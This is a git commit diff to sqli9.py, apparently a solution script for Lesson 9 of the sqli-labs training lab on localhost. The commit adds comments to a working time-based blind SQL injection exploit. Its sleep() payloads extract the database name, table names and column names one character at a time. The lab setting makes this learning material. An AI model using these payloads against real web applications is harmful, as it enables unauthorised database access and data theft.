8176e7cfd10ede63b054b37f55315472d50b2072
Aneesh nadh <61080375+an33-sh@users.noreply.github.com>
2021-01-31 10:44:36 +0530

    Update sqli9.py

--- sqli9.py
+++ sqli9.py
@@ -6,7 +6,7 @@ import requests
 request=requests.Session()
 url_len="http://localhost/sqli-labs-php7/Less-9/?id=1' and if((select length(database())={}),sleep(1),null)--+"
 
-def le(url):
+def le(url):                          #this is the function to find the length
     length=0
     for i in range(200):
         r=request.get(url.format(i))
@@ -20,7 +20,7 @@ len_db=le(url_len)
 print("length of database is: ",len_db)
 
 
-def exploit(url,length):
+def exploit(url,length):           #this is the function to find the content
     out=""
     char=string.ascii_letters+'@.,_'
     for i in range(1,length+1):
@@ -34,24 +34,24 @@ def exploit(url,length):
 
 url_dbname="http://localhost/sqli-labs-php7/Less-9/?id=1' and if((select substr(database(),{},1))='{}',sleep(1),null)--+"
 
-db_name=exploit(url_dbname,len_db)
+db_name=exploit(url_dbname,len_db)  #finding databse name
 print("database name: ",db_name)
 url_tlen="http://localhost/sqli-labs-php7/Less-9/?id=1' and if((select length(group_concat(table_name)) from information_schema.tables where table_schema='security')={},sleep(1),null)--+"
 len_t=le(url_tlen)
 
-print("table_len",len_t)
+print("table_len",len_t)            
 url_table="http://localhost/sqli-labs-php7/Less-9/?id=1' and if(substr((select group_concat(table_name) from information_schema.tables where table_schema='security'),{},1)='{}',sleep(1),null)--+"
 
-tables=exploit(url_table,29)
+tables=exploit(url_table,29)        #finding tables
 print("tables",tables)
 tb=tables.split(',')
 
 url_clen="http://localhost/sqli-labs-php7/Less-9/?id=1' and if((select length(group_concat(column_name)) from information_schema.columns where table_name='{}')={},sleep(1),null)--+"
 url_col="http://localhost/sqli-labs-php7/Less-9/?id=1' and if(substr((select group_concat(column_name) from information_schema.columns where table_name='{}'),{},1)='{}',sleep(1),null)--+"
 
-for t in tb:
+for t in tb:                        #finding columns
     pl=url_clen.format(t,{})
     l=le(pl)
     p=url_col.format(t,{},{})
     columns=exploit(p,l)
-    print("columns in "+t+"are: "+columns)
+    print("columns in "+t+" are: "+columns)
